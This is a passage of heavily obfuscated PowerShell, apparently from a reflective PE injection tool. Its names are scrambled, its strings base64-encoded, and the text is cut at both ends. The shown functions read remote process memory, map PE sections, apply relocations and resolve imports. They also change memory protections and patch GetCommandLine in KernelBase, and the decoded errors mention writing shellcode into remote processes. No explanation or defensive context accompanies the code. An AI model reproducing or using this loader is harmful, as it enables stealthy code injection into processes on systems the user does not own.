			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
		}
		${/=\_/=\/=\__/\___} = _/==\__/=\/\_____/ -_/==\/=\_/\_/==\__ ${__/\/=====\/==\___} -__/\_/====\_/====\ ${_/==\/=\/=\/=\/=\} -Win32Functions $Win32Functions
		${/==\/\___/\__/\__} = $Win32Functions.WaitForSingleObject.Invoke(${/=\_/=\/=\__/\___}, 20000)
		if (${/==\/\___/\__/\__} -ne 0)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
		}
		[IntPtr]${_/=\/\_/====\_/\_} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/===\/\_/=\_/\_/})
		${/==\/\___/\__/\__} = $Win32Functions.ReadProcessMemory.Invoke(${__/\/=====\/==\___}, ${__/\/=\__/==\__/=}, ${_/=\/\_/====\_/\_}, [UIntPtr][UInt64]${_/===\/\_/=\_/\_/}, [Ref]${/===\__/\_/\_/\__})
		if ((${/==\/\___/\__/\__} -eq $false) -or (${/===\__/\_/\_/\__} -eq 0))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFIAZQBhAGQAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAgAGYAYQBpAGwAZQBkAA==')))
		}
		[IntPtr]${_/\_/\_/=\____/=\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/=\/\_/====\_/\_}, [Type][IntPtr])
		$Win32Functions.VirtualFreeEx.Invoke(${__/\/=====\/==\___}, ${_/==\/=\/=\/=\/=\}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke(${__/\/=====\/==\___}, ${__/\/=\__/==\__/=}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        if (-not ${_/===\/===\__/==\/})
        {
            $Win32Functions.VirtualFreeEx.Invoke(${__/\/=====\/==\___}, ${_/\____/\_/\___/\}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
		return ${_/\_/\_/=\____/=\}
	}
	Function __/\/=\_/====\/=\/
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		${__/\/\/\/\/\/\_/\_},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${__/\/==\_/\_/\_/\_},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		for( ${__/\_/\/=\/======} = 0; ${__/\_/\/=\/======} -lt ${__/\/==\_/\_/\_/\_}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${__/\_/\/=\/======}++)
		{
			[IntPtr]${_/\/\___/=\/\/\__} = [IntPtr](____/\/===\__/\/== ([Int64]${__/\/==\_/\_/\_/\_}.SectionHeaderPtr) (${__/\_/\/=\/======} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			${_/\/===\/====\/\/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/\/\___/=\/\/\__}, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]${___/==\__/=\_/=\_} = [IntPtr](____/\/===\__/\/== ([Int64]${__/\/==\_/\_/\_/\_}.PEHandle) ([Int64]${_/\/===\/====\/\/}.VirtualAddress))
			${__/==\/\/==\/\/=\} = ${_/\/===\/====\/\/}.SizeOfRawData
			if (${_/\/===\/====\/\/}.PointerToRawData -eq 0)
			{
				${__/==\/\/==\/\/=\} = 0
			}
			if (${__/==\/\/==\/\/=\} -gt ${_/\/===\/====\/\/}.VirtualSize)
			{
				${__/==\/\/==\/\/=\} = ${_/\/===\/====\/\/}.VirtualSize
			}
			if (${__/==\/\/==\/\/=\} -gt 0)
			{
				__/=\__/===\/=\/\/ -___/=\_/=\_/=\/=== $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAtAFMAZQBjAHQAaQBvAG4AcwA6ADoATQBhAHIAcwBoAGEAbABDAG8AcAB5AA=='))) -__/\/==\_/\_/\_/\_ ${__/\/==\_/\_/\_/\_} -__/\_/====\_/====\ ${___/==\__/=\_/=\_} -_/==\______/\_/=\_ ${__/==\/\/==\/\/=\} | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy(${__/\/\/\/\/\/\_/\_}, [Int32]${_/\/===\/====\/\/}.PointerToRawData, ${___/==\__/=\_/=\_}, ${__/==\/\/==\/\/=\})
			}
			if (${_/\/===\/====\/\/}.SizeOfRawData -lt ${_/\/===\/====\/\/}.VirtualSize)
			{
				${/=\_/\/\____/\/=\} = ${_/\/===\/====\/\/}.VirtualSize - ${__/==\/\/==\/\/=\}
				[IntPtr]${__/\_/====\_/====\} = [IntPtr](____/\/===\__/\/== ([Int64]${___/==\__/=\_/=\_}) ([Int64]${__/==\/\/==\/\/=\}))
				__/=\__/===\/=\/\/ -___/=\_/=\_/=\/=== $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAtAFMAZQBjAHQAaQBvAG4AcwA6ADoATQBlAG0AcwBlAHQA'))) -__/\/==\_/\_/\_/\_ ${__/\/==\_/\_/\_/\_} -__/\_/====\_/====\ ${__/\_/====\_/====\} -_/==\______/\_/=\_ ${/=\_/\/\____/\/=\} | Out-Null
				$Win32Functions.memset.Invoke(${__/\_/====\_/====\}, 0, [IntPtr]${/=\_/\/\____/\/=\}) | Out-Null
			}
		}
	}
	Function __/=\_____/=\__/==
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${__/\/==\_/\_/\_/\_},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${_/==\/=\/\__/\/\/\},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		[Int64]${/====\/=\_/\/==\/} = 0
		${__/====\_/==\/\/=} = $true 
		[UInt32]${__/===\_/\/\__/\/} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		if ((${_/==\/=\/\__/\/\/\} -eq [Int64]${__/\/==\_/\_/\_/\_}.EffectivePEHandle) `
				-or (${__/\/==\_/\_/\_/\_}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}
		elseif ((___/\__/==\/=\_/=\ (${_/==\/=\/\__/\/\/\}) (${__/\/==\_/\_/\_/\_}.EffectivePEHandle)) -eq $true)
		{
			${/====\/=\_/\/==\/} = _/=\_/\/==\/\_/=== (${_/==\/=\/\__/\/\/\}) (${__/\/==\_/\_/\_/\_}.EffectivePEHandle)
			${__/====\_/==\/\/=} = $false
		}
		elseif ((___/\__/==\/=\_/=\ (${__/\/==\_/\_/\_/\_}.EffectivePEHandle) (${_/==\/=\/\__/\/\/\})) -eq $true)
		{
			${/====\/=\_/\/==\/} = _/=\_/\/==\/\_/=== (${__/\/==\_/\_/\_/\_}.EffectivePEHandle) (${_/==\/=\/\__/\/\/\})
		}
		[IntPtr]${_____/\/==\_/\_/=} = [IntPtr](____/\/===\__/\/== ([Int64]${__/\/==\_/\_/\_/\_}.PEHandle) ([Int64]${__/\/==\_/\_/\_/\_}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			${_/==\______/=\/\_} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_____/\/==\_/\_/=}, [Type]$Win32Types.IMAGE_BASE_RELOCATION)
			if (${_/==\______/=\/\_}.SizeOfBlock -eq 0)
			{
				break
			}
			[IntPtr]${/=\__/=\/===\_/\/} = [IntPtr](____/\/===\__/\/== ([Int64]${__/\/==\_/\_/\_/\_}.PEHandle) ([Int64]${_/==\______/=\/\_}.VirtualAddress))
			${/====\_/\__/\/=\/} = (${_/==\______/=\/\_}.SizeOfBlock - ${__/===\_/\/\__/\/}) / 2
			for(${__/\_/\/=\/======} = 0; ${__/\_/\/=\/======} -lt ${/====\_/\__/\/=\/}; ${__/\_/\/=\/======}++)
			{
				${_/=\/==\__/=\/\_/} = [IntPtr](____/\/===\__/\/== ([IntPtr]${_____/\/==\_/\_/=}) ([Int64]${__/===\_/\/\__/\/} + (2 * ${__/\_/\/=\/======})))
				[UInt16]${_/\/\/\/\_/=\_/=\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/=\/==\__/=\/\_/}, [Type][UInt16])
				[UInt16]${_/====\_/==\/\/==} = ${_/\/\/\/\_/=\_/=\} -band 0x0FFF
				[UInt16]${__/==\/\_/==\/\/\} = ${_/\/\/\/\_/=\_/=\} -band 0xF000
				for (${_/\_/\_/\/\/====\} = 0; ${_/\_/\_/\/\/====\} -lt 12; ${_/\_/\_/\/\/====\}++)
				{
					${__/==\/\_/==\/\/\} = [Math]::Floor(${__/==\/\_/==\/\/\} / 2)
				}
				if ((${__/==\/\_/==\/\/\} -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or (${__/==\/\_/==\/\/\} -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					[IntPtr]${_/=\/\/====\/\/=\} = [IntPtr](____/\/===\__/\/== ([Int64]${/=\__/=\/===\_/\/}) ([Int64]${_/====\_/==\/\/==}))
					[IntPtr]${_/\/=\_/====\____} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/=\/\/====\/\/=\}, [Type][IntPtr])
					if (${__/====\_/==\/\/=} -eq $true)
					{
						[IntPtr]${_/\/=\_/====\____} = [IntPtr](____/\/===\__/\/== ([Int64]${_/\/=\_/====\____}) (${/====\/=\_/\/==\/}))
					}
					else
					{
						[IntPtr]${_/\/=\_/====\____} = [IntPtr](_/=\_/\/==\/\_/=== ([Int64]${_/\/=\_/====\____}) (${/====\/=\_/\/==\/}))
					}				
					[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/\/=\_/====\____}, ${_/=\/\/====\/\/=\}, $false) | Out-Null
				}
				elseif (${__/==\/\_/==\/\/\} -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgAgAHIAZQBsAG8AYwBhAHQAaQBvAG4AIABmAG8AdQBuAGQALAAgAHIAZQBsAG8AYwBhAHQAaQBvAG4AIAB2AGEAbAB1AGUAOgAgACQAewBfAF8ALwA9AD0AXAAvAFwAXwAvAD0APQBcAC8AXAAvAFwAfQAsACAAcgBlAGwAbwBjAGEAdABpAG8AbgBpAG4AZgBvADoAIAAkAHsAXwAvAFwALwBcAC8AXAAvAFwAXwAvAD0AXABfAC8APQBcAH0A')))
				}
			}
			${_____/\/==\_/\_/=} = [IntPtr](____/\/===\__/\/== ([Int64]${_____/\/==\_/\_/=}) ([Int64]${_/==\______/=\/\_}.SizeOfBlock))
		}
	}
	Function _/===\___/\/====\_
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${__/\/==\_/\_/\_/\_},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		${__/\/=====\/==\___}
		)
		${__/\_/==\_/\/====} = $false
		if (${__/\/==\_/\_/\_/\_}.PEHandle -ne ${__/\/==\_/\_/\_/\_}.EffectivePEHandle)
		{
			${__/\_/==\_/\/====} = $true
		}
		if (${__/\/==\_/\_/\_/\_}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]${/=\/=\_/\/=\/====} = ____/\/===\__/\/== ([Int64]${__/\/==\_/\_/\_/\_}.PEHandle) ([Int64]${__/\/==\_/\_/\_/\_}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			while ($true)
			{
				${___/=\/====\/\__/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=\/=\_/\/=\/====}, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				if (${___/=\/====\/\__/}.Characteristics -eq 0 `
						-and ${___/=\/====\/\__/}.FirstThunk -eq 0 `
						-and ${___/=\/====\/\__/}.ForwarderChain -eq 0 `
						-and ${___/=\/====\/\__/}.Name -eq 0 `
						-and ${___/=\/====\/\__/}.TimeDateStamp -eq 0)
				{
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAgAGkAbQBwAG8AcgB0AGkAbgBnACAARABMAEwAIABpAG0AcABvAHIAdABzAA==')))
					break
				}
				${/====\/\/\/\/\/=\} = [IntPtr]::Zero
				${__/======\/\_/\/=\} = (____/\/===\__/\/== ([Int64]${__/\/==\_/\_/\_/\_}.PEHandle) ([Int64]${___/=\/====\/\__/}.Name))
				${__/\_/=\/\/\___/=} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${__/======\/\_/\/=\})
				if (${__/\_/==\_/\/====} -eq $true)
				{
					${/====\/\/\/\/\/=\} = __/===\____/=\_/\_ -__/\/=====\/==\___ ${__/\/=====\/==\___} -__/======\/\_/\/=\ ${__/======\/\_/\/=\}
				}
				else
				{
					${/====\/\/\/\/\/=\} = $Win32Functions.LoadLibrary.Invoke(${__/\_/=\/\/\___/=})
				}
				if ((${/====\/\/\/\/\/=\} -eq $null) -or (${/====\/\/\/\/\/=\} -eq [IntPtr]::Zero))
				{
					throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBtAHAAbwByAHQAaQBuAGcAIABEAEwATAAsACAARABMAEwATgBhAG0AZQA6ACAAJAB7AF8AXwAvAFwAXwAvAD0AXAAvAFwALwBcAF8AXwBfAC8APQB9AA==')))
				}
				[IntPtr]${__/=\/=\_/=======} = ____/\/===\__/\/== (${__/\/==\_/\_/\_/\_}.PEHandle) (${___/=\/====\/\__/}.FirstThunk)
				[IntPtr]${______/=\/\/==\/=} = ____/\/===\__/\/== (${__/\/==\_/\_/\_/\_}.PEHandle) (${___/=\/====\/\__/}.Characteristics) 
				[IntPtr]${_/\/=\__/\_/=\/==} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${______/=\/\/==\/=}, [Type][IntPtr])
				while (${_/\/=\__/\_/=\/==} -ne [IntPtr]::Zero)
				{
                    ${_/===\/===\__/==\/} = $false
                    [IntPtr]${_/\_/\_/=\/\/=\/\} = [IntPtr]::Zero
					[IntPtr]${/==\___/\/===\_/\} = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]${_/\/=\__/\_/=\/==} -lt 0)
					{
						[IntPtr]${_/\_/\_/=\/\/=\/\} = [IntPtr]${_/\/=\__/\_/=\/==} -band 0xffff 
                        ${_/===\/===\__/==\/} = $true
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]${_/\/=\__/\_/=\/==} -lt 0)
					{
						[IntPtr]${_/\_/\_/=\/\/=\/\} = [Int64]${_/\/=\__/\_/=\/==} -band 0xffff 
                        ${_/===\/===\__/==\/} = $true
					}
					else
					{
						[IntPtr]${___/\/=\/====\__/} = ____/\/===\__/\/== (${__/\/==\_/\_/\_/\_}.PEHandle) (${_/\/=\__/\_/=\/==})
						${___/\/=\/====\__/} = ____/\/===\__/\/== ${___/\/=\/====\__/} ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						${_/=====\/==\____/} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${___/\/=\/====\__/})
                        ${_/\_/\_/=\/\/=\/\} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${_/=====\/==\____/})
					}
					if (${__/\_/==\_/\/====} -eq $true)
					{
						[IntPtr]${/==\___/\/===\_/\} = __/==\_____/\/\__/ -__/\/=====\/==\___ ${__/\/=====\/==\___} -_/=\/\_/\___/===\_ ${/====\/\/\/\/\/=\} -__/\_/==\__/\/===\ ${_/\_/\_/=\/\/=\/\} -_/===\/===\__/==\/ ${_/===\/===\__/==\/}
					}
					else
					{
				        [IntPtr]${/==\___/\/===\_/\} = $Win32Functions.GetProcAddressIntPtr.Invoke(${/====\/\/\/\/\/=\}, ${_/\_/\_/=\/\/=\/\})
					}
					if (${/==\___/\/===\_/\} -eq $null -or ${/==\___/\/===\_/\} -eq [IntPtr]::Zero)
					{
                        if (${_/===\/===\__/==\/})
                        {
                            Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHcAIABmAHUAbgBjAHQAaQBvAG4AIAByAGUAZgBlAHIAZQBuAGMAZQAgAGkAcwAgAG4AdQBsAGwALAAgAHQAaABpAHMAIABpAHMAIABhAGwAbQBvAHMAdAAgAGMAZQByAHQAYQBpAG4AbAB5ACAAYQAgAGIAdQBnACAAaQBuACAAdABoAGkAcwAgAHMAYwByAGkAcAB0AC4AIABGAHUAbgBjAHQAaQBvAG4AIABPAHIAZABpAG4AYQBsADoAIAAkAHsAXwAvAFwAXwAvAFwAXwAvAD0AXAAvAFwALwA9AFwALwBcAH0ALgAgAEQAbABsADoAIAAkAHsAXwBfAC8AXABfAC8APQBcAC8AXAAvAFwAXwBfAF8ALwA9AH0A')))
                        }
                        else
                        {
						    Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHcAIABmAHUAbgBjAHQAaQBvAG4AIAByAGUAZgBlAHIAZQBuAGMAZQAgAGkAcwAgAG4AdQBsAGwALAAgAHQAaABpAHMAIABpAHMAIABhAGwAbQBvAHMAdAAgAGMAZQByAHQAYQBpAG4AbAB5ACAAYQAgAGIAdQBnACAAaQBuACAAdABoAGkAcwAgAHMAYwByAGkAcAB0AC4AIABGAHUAbgBjAHQAaQBvAG4AOgAgACQAewBfAC8APQA9AD0APQA9AFwALwA9AD0AXABfAF8AXwBfAC8AfQAuACAARABsAGwAOgAgACQAewBfAF8ALwBcAF8ALwA9AFwALwBcAC8AXABfAF8AXwAvAD0AfQA=')))
                        }
					}
					[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/==\___/\/===\_/\}, ${__/=\/=\_/=======}, $false)
					${__/=\/=\_/=======} = ____/\/===\__/\/== ([Int64]${__/=\/=\_/=======}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]${______/=\/\/==\/=} = ____/\/===\__/\/== ([Int64]${______/=\/\/==\/=}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]${_/\/=\__/\_/=\/==} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${______/=\/\/==\/=}, [Type][IntPtr])
                    if ((-not ${_/===\/===\__/==\/}) -and (${_/\_/\_/=\/\/=\/\} -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${_/\_/\_/=\/\/=\/\})
                        ${_/\_/\_/=\/\/=\/\} = [IntPtr]::Zero
                    }
				}
				${/=\/=\_/\/=\/====} = ____/\/===\__/\/== (${/=\/=\_/\/=\/====}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}
	Function _______/\_/\/=\_/\
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		${____/\/\/===\/===\}
		)
		${___/==\/\/\_/\/\_} = 0x0
		if ((${____/\/\/===\/===\} -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if ((${____/\/\/===\/===\} -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if ((${____/\/\/===\/===\} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${___/==\/\/\_/\/\_} = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					${___/==\/\/\_/\/\_} = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if ((${____/\/\/===\/===\} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${___/==\/\/\_/\/\_} = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					${___/==\/\/\_/\/\_} = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if ((${____/\/\/===\/===\} -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if ((${____/\/\/===\/===\} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${___/==\/\/\_/\/\_} = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					${___/==\/\/\_/\/\_} = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if ((${____/\/\/===\/===\} -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${___/==\/\/\_/\/\_} = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					${___/==\/\/\_/\/\_} = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		if ((${____/\/\/===\/===\} -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			${___/==\/\/\_/\/\_} = ${___/==\/\/\_/\/\_} -bor $Win32Constants.PAGE_NOCACHE
		}
		return ${___/==\/\/\_/\/\_}
	}
	Function __/=\__/=\/\/==\/\
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${__/\/==\_/\_/\_/\_},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		for( ${__/\_/\/=\/======} = 0; ${__/\_/\/=\/======} -lt ${__/\/==\_/\_/\_/\_}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${__/\_/\/=\/======}++)
		{
			[IntPtr]${_/\/\___/=\/\/\__} = [IntPtr](____/\/===\__/\/== ([Int64]${__/\/==\_/\_/\_/\_}.SectionHeaderPtr) (${__/\_/\/=\/======} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			${_/\/===\/====\/\/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/\/\___/=\/\/\__}, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]${____/\_/==\/\_/==} = ____/\/===\__/\/== (${__/\/==\_/\_/\_/\_}.PEHandle) (${_/\/===\/====\/\/}.VirtualAddress)
			[UInt32]${_/\/\/===\_/\/=\_} = _______/\_/\/=\_/\ ${_/\/===\/====\/\/}.Characteristics
			[UInt32]${/===\/==\/\/====\} = ${_/\/===\/====\/\/}.VirtualSize
			[UInt32]${_/\_/=\_/=====\__} = 0
			__/=\__/===\/=\/\/ -___/=\_/=\_/=\/=== $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUALQBNAGUAbQBvAHIAeQBQAHIAbwB0AGUAYwB0AGkAbwBuAEYAbABhAGcAcwA6ADoAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0AA=='))) -__/\/==\_/\_/\_/\_ ${__/\/==\_/\_/\_/\_} -__/\_/====\_/====\ ${____/\_/==\/\_/==} -_/==\______/\_/=\_ ${/===\/==\/\/====\} | Out-Null
			${__/==\_/======\/=} = $Win32Functions.VirtualProtect.Invoke(${____/\_/==\/\_/==}, ${/===\/==\/\/====\}, ${_/\/\/===\_/\/=\_}, [Ref]${_/\_/=\_/=====\__})
			if (${__/==\_/======\/=} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGgAYQBuAGcAZQAgAG0AZQBtAG8AcgB5ACAAcAByAG8AdABlAGMAdABpAG8AbgA=')))
			}
		}
	}
	Function _/=\/\/\_________/
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${__/\/==\_/\_/\_/\_},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		${___/\_/\___/\_/\/=},
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		${____/\/\/==\_/=\/\}
		)
		${_/\__/===\__/====} = @() 
		${_/===\/\_/=\_/\_/} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]${_/\_/=\_/=====\__} = 0
		[IntPtr]${/=\_/\/=\/\_____/} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		if (${/=\_/\/=\/\_____/} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAMwAyACAAaABhAG4AZABsAGUAIABuAHUAbABsAA==')))
		}
		[IntPtr]${_/\_/\/\/\/\/\__/} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAQgBhAHMAZQAuAGQAbABsAA=='))))
		if (${_/\_/\/\/\/\/\__/} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAQgBhAHMAZQAgAGgAYQBuAGQAbABlACAAbgB1AGwAbAA=')))
		}
		${_/===\_/==\_/\/=\} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${___/\_/\___/\_/\/=})
		${/==\/=\/\_/===\_/} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${___/\_/\___/\_/\/=})
		[IntPtr]${_________/\_/=\_/} = $Win32Functions.GetProcAddress.Invoke(${_/\_/\/\/\/\/\__/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlAEEA'))))
		[IntPtr]${/=\_/=\/\_/=\__/=} = $Win32Functions.GetProcAddress.Invoke(${_/\_/\/\/\/\/\__/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlAFcA'))))
		if (${_________/\_/=\_/} -eq [IntPtr]::Zero -or ${/=\_/=\/\_/=\__/=} -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(____/=\__/=\_/==\/ ${_________/\_/=\_/}). GetCommandLineW: $(____/=\__/=\_/==\/ ${/=\_/=\/\_/=\__/=})"
		}
		[Byte[]]${_/\/==\_/=\_/\___} = @()
		if (${_/===\/\_/=\_/\_/} -eq 8)
		{
			${_/\/==\_/=\_/\___} += 0x48	
		}
		${_/\/==\_/=\_/\___} += 0xb8
		[Byte[]]${_/\/=\/=\/===\_/\} = @(0xc3)
		${___/\/\/=\/\/\_/=} = ${_/\/==\_/=\_/\___}.Length + ${_/===\/\_/=\_/\_/} + ${_/\/=\/=\/===\_/\}.Length
		${__/\_/===\/\/==\_} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${___/\/\/=\/\/\_/=})
		${/===\/==\____/=\/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${___/\/\/=\/\/\_/=})
		$Win32Functions.memcpy.Invoke(${__/\_/===\/\/==\_}, ${_________/\_/=\_/}, [UInt64]${___/\/\/=\/\/\_/=}) | Out-Null
		$Win32Functions.memcpy.Invoke(${/===\/==\____/=\/}, ${/=\_/=\/\_/=\__/=}, [UInt64]${___/\/\/=\/\/\_/=}) | Out-Null
		${_/\__/===\__/====} += ,(${_________/\_/=\_/}, ${__/\_/===\/\/==\_}, ${___/\/\/=\/\/\_/=})
		${_/\__/===\__/====} += ,(${/=\_/=\/\_/=\__/=}, ${/===\/==\____/=\/}, ${___/\/\/=\/\/\_/=})
		[UInt32]${_/\_/=\_/=====\__} = 0
		${__/==\_/======\/=} = $Win32Functions.VirtualProtect.Invoke(${_________/\_/=\_/}, [UInt32]${___/\/\/=\/\/\_/=}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${_/\_/=\_/=====\__})
		if (${__/==\_/======\/=} = $false)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
		}
		${_/=\_/\/=\____/\/} = ${_________/\_/=\_/}
